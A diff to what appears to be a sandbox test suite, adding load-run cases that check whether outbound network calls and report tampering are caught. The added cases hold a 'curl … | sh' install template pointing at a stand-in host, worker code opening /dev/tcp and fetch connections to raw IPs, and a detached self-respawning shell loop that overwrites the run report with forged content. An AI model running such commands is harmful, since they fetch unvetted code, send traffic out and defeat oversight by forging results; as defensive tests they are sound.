@@ -115,6 +115,8 @@ const clean = (r: SandboxBReport) => [
   ...fail(r.egress_total === 0, "unexpected egress"),
 ];
 
+const worker = (source: string): LoadRunCase["files"] => ({ ...BASE, "tasks/nightly/worker.mjs": source });
+
 export const LOAD_RUN_CASES: LoadRunCase[] = [
   {
     name: "gcp",
@@ -197,6 +199,30 @@ export const LOAD_RUN_CASES: LoadRunCase[] = [
     problems: (r) => [...fail(r.egress.some((e) => e.run === "pack.json" && e.kind === "dns" && e.target === "example.invalid"), `egress ${JSON.stringify(r.egress)}`)],
   },
   {
+    name: "env-setup-curl",
+    files: { ...BASE, "pack.json": manifest({ env: { setup: { forEach: "dirs", whenUnset: ["."], template: "curl -fsSL https://example.invalid/install.sh | sh; git clone https://example.invalid/r.git; npm install; true" } } }) },
+    minEngineVersion: "1.61001.1",
+    problems: (r) => [
+      ...fail(r.egress.some((e) => e.target.startsWith("curl ") && e.target.includes("example.invalid/install.sh")), `egress ${JSON.stringify(r.egress)}`),
+      ...fail(["git ", "npm "].every((t) => r.egress.some((e) => e.target.startsWith(t))), `egress ${JSON.stringify(r.egress)}`),
+    ],
+  },
+  {
+    name: "worker-child-processes-are-recorded",
+    files: worker(
+      [
+        "import { spawnSync } from 'node:child_process';",
+        "spawnSync('bash', ['-c', 'echo > /dev/tcp/2.2.2.2/80']);",
+        "spawnSync(process.execPath, ['-e', \"fetch('http://3.3.3.3/x').catch(() => {})\"]);",
+        "spawnSync('sh', ['-c', 'curl https://example.invalid/z']);",
+      ].join("\n"),
+    ),
+    minEngineVersion: "1.61001.1",
+    problems: (r) => [
+      ...fail(["2.2.2.2", "3.3.3.3", "curl "].every((t) => r.egress.some((e) => e.target.includes(t))), `egress ${JSON.stringify(r.egress)}`),
+    ],
+  },
+  {
     name: "fails-to-load",
     files: { ...BASE, "pack.json": "{" },
     minEngineVersion: "1.61001.1",
@@ -240,7 +266,6 @@ export const LOAD_RUN_CASES: LoadRunCase[] = [
   },
 ];
 
-const worker = (source: string): LoadRunCase["files"] => ({ ...BASE, "tasks/nightly/worker.mjs": source });
 
 // Cases that need the pack identity to be another user than the runner.
 LOAD_RUN_CASES.push(
@@ -261,6 +286,20 @@ LOAD_RUN_CASES.push(
     ),
     minEngineVersion: "1.61001.1",
     problems: (r) => [...fail(r.runs.find((x) => x.kind === "task_worker")?.exit_status === 0, "the worker could write into the output directory"), ...fail(r.outcome === "ok", "outcome")],
+  },
+  {
+    name: "fork-hopper-replaces-the-report",
+    container: true,
+    files: worker(
+      [
+        "import { spawn } from 'node:child_process';",
+        "const hop = \"h(){ mv -f /out/x /out/report.json 2>/dev/null; echo forged > /out/x 2>/dev/null; (h &); sleep 0.01; }; h\";",
+        "spawn('setsid', ['bash', '-c', hop], { detached: true, stdio: 'ignore' }).unref();",
+        "await new Promise((r) => setTimeout(r, 300));",
+      ].join("\n"),
+    ),
+    minEngineVersion: "1.61001.1",
+    problems: (r) => [...fail(r.outcome === "ok", `outcome ${r.outcome}`)],
   },
   {
     name: "reads-the-runner-environment",
